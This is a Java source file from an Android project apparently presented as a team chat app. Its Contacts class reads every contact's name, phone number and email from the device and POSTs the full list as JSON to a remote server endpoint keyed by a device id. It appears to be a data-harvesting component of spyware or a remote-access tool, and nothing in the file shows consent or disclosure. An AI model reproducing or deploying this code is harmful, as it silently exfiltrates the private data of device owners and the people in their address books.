package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

public class Contacts {
    private ContentResolver contentResolver;
    private final static String TAG = ChatService.class.getSimpleName();


    public static void getContacts(Context context, String id) throws JSONException {
        ContentResolver contentResolver = context.getContentResolver();
        Log.d(TAG,"reading contacts");
        JSONArray contactsArray = new JSONArray();

        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cursor.moveToFirst()){
            do {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String phoneNumber = null;
                String email = null;

                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phoneCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null);

                    while (phoneCursor.moveToNext()) {
                        phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    }
                    phoneCursor.close();
                }

                Cursor emailCursor = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null);

                while (emailCursor.moveToNext()) {
                    email = emailCursor.getString(emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                }
                emailCursor.close();

                JSONObject json = null;
                try {
                    // Create a JSON object to send to the server
                    json = new JSONObject();
                    json.put("name", name);
                    json.put("phoneNumber", phoneNumber);
                    json.put("email", email);
                    contactsArray.put(json);
                } catch (JSONException e) {
                    Log.e(TAG, "Error creating JSON object: " + e.getMessage());
                }


            } while (cursor.moveToNext());
        }
        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "contacts");
        parentObject.put("data", contactsArray);
        System.out.println(parentObject.toString());
        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }
}